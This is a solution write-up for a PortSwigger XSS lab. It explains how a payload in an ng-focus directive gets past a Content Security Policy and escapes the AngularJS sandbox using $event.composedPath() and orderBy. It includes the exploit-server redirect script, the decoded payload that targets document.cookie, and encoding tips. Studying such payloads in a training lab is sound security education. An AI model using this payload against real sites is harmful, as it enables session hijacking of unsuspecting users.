# Lab 26: Reflected XSS with AngularJS sandbox escape and CSP

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Expert  
**Lab link:** [Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

## Overview

The app uses AngularJS with the sandbox enabled AND a Content Security Policy that blocks inline scripts and native event handlers. Two defenses to bypass simultaneously: AngularJS directives bypass CSP (they're processed by AngularJS, not as native handlers), and `$event.composedPath()` escapes the sandbox by exposing the `Window` object in the DOM event path.

## Key Concepts

- **AngularJS directives bypass CSP:** `ng-focus`, `ng-click`, etc. are evaluated by AngularJS's own parser (a trusted same-origin script), not as native inline handlers — CSP doesn't block them
- **`$event.composedPath()` sandbox escape:** Returns the DOM event path array including `Window` — gives access to `alert` from within the sandbox
- **`orderBy` filter execution:** Evaluates an expression that can access `window.alert` through the composed path
- **`#id` auto-focus:** Fragment triggers focus on the input element, firing `ng-focus`

## Solution

1. Go to exploit server, set body to:

```html
<script>
location='https://LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

2. Store → Deliver to victim

## Payload Breakdown

The search parameter decodes to:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

- `<input id=x>` — focusable element with anchor target
- `ng-focus=` — AngularJS directive, bypasses CSP (not a native inline handler)
- `$event.composedPath()` — returns `[input, body, html, document, Window]`, escaping the sandbox
- `|orderBy:'(z=alert)(document.cookie)'` — evaluates the expression with access to `Window.alert`
- `#x` — fragment auto-focuses the input, triggering `ng-focus`

## URL Encoding Gotcha

Keep encoding minimal inside the search value — only encode `<` (`%3C`), `>` (`%3E`), and quotes (`%27`). Leave `=`, `$`, `:`, `|` as literal characters. Over-encoding (e.g., `%7C` for `|`) can cause the server to reflect encoded forms that AngularJS can't parse.

## Expert Lab Comparison

| Lab | Defenses | Bypass |
|-----|----------|--------|
| Lab 25 | Sandbox + no strings | charAt override + fromCharCode + orderBy |
| Lab 26 | Sandbox + CSP | ng-focus directive + $event.composedPath() + orderBy |
